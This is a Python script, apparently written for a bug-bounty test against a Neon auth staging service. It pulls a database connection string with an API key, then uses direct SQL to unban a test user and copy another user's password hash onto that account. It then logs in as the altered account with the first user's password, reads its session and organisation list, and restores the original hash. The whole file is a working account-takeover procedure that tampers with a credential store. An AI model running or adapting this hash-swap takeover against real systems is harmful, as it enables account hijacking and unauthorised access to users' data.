# -*- coding: utf-8 -*-
"""V28d: unban U2 + redo hash-swap takeover (clean state)"""
import json, ssl, time, http.client

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U1_ID = "f2366454-d3f4-4a80-ba3b-e5ca93c25f82"
U2_ID = "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def main():
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    out("== V28d unban + hash swap ==")
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    dbc = psycopg.connect(uri2, connect_timeout=15)
    dbc.autocommit = True
    # unban U2
    with dbc.cursor() as cur:
        cur.execute("UPDATE neon_auth.user SET banned=False, \"banReason\"=NULL, \"banExpires\"=NULL WHERE id=%s", (U2_ID,))
        cur.execute("SELECT banned FROM neon_auth.user WHERE id=%s", (U2_ID,))
        out("U2 banned now: %s" % cur.fetchone()[0])
    # hash swap: copy U1 hash to U2, login U2 with U1's password
    with dbc.cursor() as cur:
        cur.execute("SELECT password FROM neon_auth.account WHERE \"userId\"=%s", (U1_ID,))
        u1_hash = cur.fetchone()[0]
        cur.execute("SELECT password FROM neon_auth.account WHERE \"userId\"=%s", (U2_ID,))
        u2_orig = cur.fetchone()[0]
        cur.execute("UPDATE neon_auth.account SET password=%s WHERE \"userId\"=%s", (u1_hash, U2_ID))
    st, d, ck = na("POST", "/neondb/auth/sign-in/email",
                   {"email": "libobo1229+na_org2@gmail.com", "password": PASS})
    out("U2 login w/ U1 password -> %s %s" % (st, d[:120]))
    if st == 200:
        c = ck.split(";")[0]
        st2, d2, _ = na("GET", "/neondb/auth/get-session", cookie=c)
        out("session as U2: %s" % d2[:220])
        st3, d3, _ = na("GET", "/neondb/auth/organization/list", cookie=c)
        out("org/list as U2: %s" % d3[:150])
    # restore
    with dbc.cursor() as cur:
        cur.execute("UPDATE neon_auth.account SET password=%s WHERE \"userId\"=%s", (u2_orig, U2_ID))
    out("hash restored")
    # U1 role sanity + U2 normal login
    with dbc.cursor() as cur:
        cur.execute("SELECT role FROM neon_auth.user WHERE id=%s", (U1_ID,))
        out("U1 role: %s" % cur.fetchone()[0])
    st, d, ck = na("POST", "/neondb/auth/sign-in/email",
                   {"email": "libobo1229+na_org2@gmail.com", "password": PASS})
    out("U2 normal login restored: %s" % st)
    # cleanup sessions created during tests (U2 extra sessions are harmless but tidy)
    dbc.close()
    out("done")


if __name__ == "__main__":
    main()
